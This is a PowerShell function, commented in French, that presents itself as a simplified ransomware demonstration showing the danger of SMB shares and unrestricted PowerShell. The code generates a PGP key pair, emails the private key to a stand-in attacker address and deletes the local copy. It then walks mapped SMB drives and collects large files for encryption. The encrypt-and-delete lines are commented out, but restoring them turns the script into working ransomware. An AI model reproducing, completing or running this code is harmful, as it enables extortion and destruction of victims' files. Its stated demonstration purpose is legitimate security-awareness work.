function Set-SimpleCryptolocker(){
<#
.SYNOPSIS
    Ce script va encrypter les fichiers le plus volumineux accessibles dans les partages SMB du profil exécutant la présente fonction
 
.NOTES
    Name: Set-SimpleCryptolocker
    Author: Gabriel Hubert-St-Onge
    Version: 2.0
    DateCreated: 2022-Aug-4
 
 .DESCRIPTION
   Ce script a été écrit dans l'intention de démontrer la nécessité d'éviter les partages SMB et la nécessité de restreindre l'accès à PowerShell 
   aux utilisateurs standard. Plusieurs éléments de ce script sont simplifié pour la démonstration (mot de passe très simple, transfert de la clé 
   privé par courriel, filtre très sommaire des fichiers à encrypter, aucune encryption sur le disque local, etc.) 
   
.LINK
    https://github.com/GabHubs/PowerShell
#>

    # Installation d'un module dans le profil de l'utilisateur (non-admin) ajoutant les fonctions d'encryption directement des sources officielles Microsoft
    Install-Module -Name PSPGP -AcceptLicense -Scope CurrentUser -SkipPublisherCheck -force
    
    #Génération de l'encryption
    $key = Get-Random
    $priv_File = "$env:APPDATA\priv.asc"
    $pub_File = "$env:APPDATA\pub.asc"
    New-PGPKey -FilePathPrivate $priv_File -FilePathPublic $pub_File -Password $key

    #Génération d'une liste des fichiers contenant les fichier encryptés pour la démonstration
    $log = @()

    #Envoie de la clé d'encryption et suppression de la copie locale de celle-ci
    Send-MailMessage -From Crypto@powershell.com -Subject Encryption -To Hacker@DarkWeb.com -Attachments $priv_File -SmtpServer smtp.com
    Remove-Item $priv_File

    # Obtenir les map réseaux SMB disponibles du profil exécutant la fonction
    $maping = (Get-SmbMapping | where {$_.Status -eq "OK" -and $_.LocalPath -ne ""})

    # Pour chacun des lecteurs réseaux, nous encryptons les fichiers les plus volumineux seulement. 
    foreach ($map in $maping)
    {
        $files = (Get-ChildItem -path $map.LocalPath -Recurse | where {$_.Length -gt 999999})
        foreach ($file in $files)
        {
            #Protect-PGP -FilePathPublic $pub_File -FolderPath $file.FullName -OutputFolderPath $file.Directory
            #Remove-Item -Path $file.FullName -Force
            $log += $file.FullName
        }
    }
    return $log
}
